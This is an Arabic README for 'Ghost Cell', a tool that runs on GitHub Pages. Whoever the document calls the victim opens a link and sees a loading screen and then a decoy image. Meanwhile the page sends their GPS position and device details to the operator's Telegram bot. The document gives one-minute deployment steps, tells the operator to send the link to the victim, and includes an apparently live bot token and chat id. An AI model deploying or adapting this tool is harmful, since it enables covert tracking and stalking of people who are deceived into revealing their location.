# Ghost Cell — Zero Infrastructure

**ما تحتاج سيرفر. ما تحتاج Render. ما تحتاج VPS.**
GitHub Pages فقط + تلجرام مباشر.

## المعمارية

```
الضحية يفتح الرابط
    ↓
المتصفح يطلب GPS (بعد موافقة المستخدم)
    ↓
GPS يصل → يرسل مباشرة إلى Telegram Bot API
    ↓
🍟♤ CATShadow يشوف الموقع في تلجرام فوراً
```

## النشر (دقيقة واحدة)

1. أنشئ ريبو جديد على GitHub:
```
اسم الريبو: ghost-cell (أي اسم)
Private أو Public
```

2. ارفع الملفات:
```bash
cd ghost-gh-pages
git init
git add .
git commit -m "init"
git remote add origin https://github.com/yourname/ghost-cell.git
git push -u origin main
```

3. فعّل GitHub Pages:
- Settings → Pages
- Source: **Deploy from branch**
- Branch: `main`, folder: `/docs`
- Save

4. انتظر دقيقة → الرابط يصير:
```
https://yourname.github.io/ghost-cell/
```

## الإستخدام

- أرسل الرابط للضحية
- يفتح → يشوف "جاري التحميل..." ثم صورة وهمية
- **في الخلفية:** الموقع يرسل إلى تلجرامك مباشرة
- **يوصلك إشعارين:**
  1. `sendLocation` → يظهر الموقع على خريطة داخل تلجرام
  2. `sendMessage` → معلومات الجهاز + رابط خرائط

## تعديل التوكن والـ ID

افتح `docs/index.html` وعدل:
- `bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg` ← التوكن
- `chat_id=972326806` ← الـ chat id حقك

## ملاحظات

- الموقع يحتاج HTTPS (GitHub Pages يعطيك إياه مجاناً)
- accuracy ±5متر إذا كان GPS شغال
- ما يحتاج أي صلاحيات خاصة من المتصفح غير الموقع
- إذا رفض الضحية طلب الموقع → يرسل إشعار "تم الرفض"
